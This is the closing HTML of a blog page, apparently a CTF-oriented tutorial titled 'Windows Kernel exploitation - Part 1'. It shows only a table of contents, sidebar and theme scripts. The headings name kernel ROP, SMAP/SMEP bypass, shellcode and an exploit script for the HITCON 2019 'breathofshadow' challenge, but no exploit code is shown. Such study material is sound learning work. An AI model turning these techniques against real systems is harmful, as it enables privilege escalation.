toc-level-4"><a class="toc-link" href="#primary-token"><span class="toc-number">1.5.6.1.</span> <span class="toc-text">primary token</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#impersonation-token"><span class="toc-number">1.5.6.2.</span> <span class="toc-text">impersonation token</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#control-register-CPU-Control"><span class="toc-number">1.5.7.</span> <span class="toc-text">control register(CPU Control)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MMU-Memory-manager-unit"><span class="toc-number">1.5.8.</span> <span class="toc-text">MMU(Memory manager unit)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#page"><span class="toc-number">1.5.8.1.</span> <span class="toc-text">page</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#page-table"><span class="toc-number">1.5.8.2.</span> <span class="toc-text">page table</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTE"><span class="toc-number">1.5.9.</span> <span class="toc-text">PTE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#demand-page"><span class="toc-number">1.5.9.1.</span> <span class="toc-text">demand page</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#page-fault"><span class="toc-number">1.5.9.2.</span> <span class="toc-text">page fault</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Swap-in-out"><span class="toc-number">1.5.9.3.</span> <span class="toc-text">Swap in&#x2F;out</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Virtual-address-to-Physical-address"><span class="toc-number">1.5.9.4.</span> <span class="toc-text">Virtual address to Physical address</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gdb-demo"><span class="toc-number">1.5.9.5.</span> <span class="toc-text">gdb demo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-driver"><span class="toc-number">1.6.</span> <span class="toc-text">windows driver</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IRP"><span class="toc-number">1.6.1.</span> <span class="toc-text">IRP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-install-windows-driver"><span class="toc-number">1.6.2.</span> <span class="toc-text">How to install windows driver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#how-to-use-your-driver"><span class="toc-number">1.6.3.</span> <span class="toc-text">how to use your driver</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Protection"><span class="toc-number">1.7.</span> <span class="toc-text">Protection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KASLR"><span class="toc-number">1.7.1.</span> <span class="toc-text">KASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMEP"><span class="toc-number">1.7.2.</span> <span class="toc-text">SMEP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMAP"><span class="toc-number">1.7.3.</span> <span class="toc-text">SMAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KVA-shadow"><span class="toc-number">1.7.4.</span> <span class="toc-text">KVA shadow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stack-Cookies"><span class="toc-number">1.7.5.</span> <span class="toc-text">Stack Cookies</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#information-leak"><span class="toc-number">1.8.</span> <span class="toc-text">information leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2usr"><span class="toc-number">1.9.</span> <span class="toc-text">ret2usr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HITCON-CTF-2019-Qual-breathofshadow"><span class="toc-number">1.10.</span> <span class="toc-text">HITCON CTF 2019 Qual breathofshadow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#analyze"><span class="toc-number">1.10.1.</span> <span class="toc-text">analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EoP"><span class="toc-number">1.10.2.</span> <span class="toc-text">EoP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#debug-and-install-windows-driver"><span class="toc-number">1.10.3.</span> <span class="toc-text">debug and install windows driver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%96%8B%E5%A7%8B-exploit-%E8%A7%80%E5%AF%9F"><span class="toc-number">1.10.4.</span> <span class="toc-text">開始 exploit - 觀察</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xor-Key"><span class="toc-number">1.10.5.</span> <span class="toc-text">Xor Key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#leak-kernel-base-and-stack-cookie"><span class="toc-number">1.10.6.</span> <span class="toc-text">leak kernel base and stack cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kernel-ROP"><span class="toc-number">1.10.7.</span> <span class="toc-text">Kernel ROP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-SMAP-SMEP"><span class="toc-number">1.10.8.</span> <span class="toc-text">bypass SMAP&#x2F;SMEP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jump-to-shellcode"><span class="toc-number">1.10.9.</span> <span class="toc-text">jump to shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#script"><span class="toc-number">1.11.</span> <span class="toc-text">script</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo"><span class="toc-number">1.12.</span> <span class="toc-text">Demo</span></a></li></ol></li></ol>
      
  </div>
</div>
</div>
      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
  <div class="sidebar-author-name">Naup堇姬</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    <div class="sidebar-state-number">72</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">0</div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">21</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-email sidebar-social-icon">
      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
    </div>
  
    <div class="icon-github sidebar-social-icon">
      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">Home</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">Archives</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">About</div>
      </div>
    
  
</div>
</div>
    
  </div>
  
    <div class="sidebar-btn-wrapper">
      <div class="sidebar-toc-btn current"></div>
      <div class="sidebar-common-btn"></div>
    </div>
  
</nav>

    </div>
    
    
<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>


<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>



<script src="/js/script.js"></script>



  
<script src="/js/aos.js"></script>

  <script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', aosInit);
    } else {
      aosInit();
    }
  </script>



<script src="/js/pjax_script.js" data-pjax></script>







  
<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>

  <script>
    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
  </script>










<div id="lazy-script">
  <div>
    
      
      
      <script data-pjax>
        window.REIMU_POST = {
          author: "Naup堇姬",
          title: "Windows Kernel exploitation - Part 1",
          url: "http://example.com/2025/04/02/Windows-Kernel-Exploitation-Part1/",
          excerpt: "",
          description: "",
          stripContent: "Windows Kernel exploitation - Part 1 Author: 堇姬Naup  What is Kernelkernel位於application和hardware之間，是OS的core也負責溝通hadware和process負責了像是I&amp;#x2F;O、process、memory、driver managemet或是syscall 等事情 kernel也提供了可以跑application的環境application是run在ring3，而kernel則是ring0 1",
          date: "Wed Apr 02 2025 19:33:49 GMT+0800",
          updated: "Wed Apr 02 2025 19:36:15 GMT+0800",
          cover: "/images/posts_cover/Windows-kernel-exploitation/Windows-kernel-exploitation.webp",
        };
      </script>
       
    
    
      
        
<script src="/js/insert_highlight.js" data-pjax></script>

        
      
    
    
      <script type="module" data-pjax>
        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
        
        const pswp = () => {
          if (_$$('.article-entry a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-entry',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
            }).init();
          }
          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-gallery',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
            }).init();
          }
          window.lightboxStatus = 'done';
          window.removeEventListener('lightbox:ready', pswp);
        }
        if(window.lightboxStatus === 'ready') {
          pswp()
        } else {
          window.addEventListener('lightbox:ready', pswp);
        }
      </script>
      








    
  </div>
</div>


  <script>
    console.log(String.raw`%c 
 ______     ______     __     __    __     __  __    
/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
 \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                  
`,'color: #ff5252;')
    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
  </script>
  



  
<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>




<script>
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.getRegistrations().then((registrations) => {
      for (let registration of registrations) {
        registration.unregister();
      }
    });
  }
</script>







  </body>
  </html>

